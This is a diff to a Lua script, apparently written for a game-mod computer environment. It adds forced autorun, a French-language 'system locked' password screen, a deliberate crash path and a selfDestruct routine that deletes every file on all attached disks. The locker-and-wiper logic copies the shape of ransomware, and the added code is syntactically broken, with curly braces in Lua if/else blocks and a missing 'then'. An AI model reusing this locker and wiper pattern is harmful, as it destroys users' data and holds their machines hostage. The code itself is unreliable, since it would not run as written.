@@ -10,6 +10,13 @@ local ATTEMPT_DELAY = 5
 local MAX_ATTEMPTS = 3
 local attempts = 0
 
+function EnableAutorun()
+  fs.setAutorunEnabled(true)
+  computer.stop()
+  Sleep(0.1)
+  computer.start()
+end
+
 function Sleep(timeout)
   local deadline = computer.uptime() + timeout
   repeat
@@ -18,10 +25,16 @@ function Sleep(timeout)
 end
 
 function lockScreen()
-  if(fs.isAutorunEnabled())
-  term.clear()
-  term.write("=== Système verrouillé par Z Industries ===\n")
-  term.write("Entrez le mot de passe pour déverrouiller :\n")
+  if(fs.isAutorunEnabled()) {
+    term.clear()
+    term.write("=== Système verrouillé par Z Industries ===\n")
+    term.write("Entrez le mot de passe pour déverrouiller :\n")
+  } else {
+      term.clear()
+      term.write("Autorun non activé, crash de l'infrastructure en cours.")
+      Sleep(0.1)
+      computer.crash("Autorun non actif, veuillez redémarrer l'infrastructure")
+    }
 end
 
 function selfDestruct()
@@ -32,7 +45,6 @@ function selfDestruct()
 
   -- Suppression de tous les fichiers sur tous les disques
   for address in component.list("filesystem") do
-    fs.setAutorunEnabled(true)
     if fs then
       for file in fs.list("/") or {} do
         pcall(function()
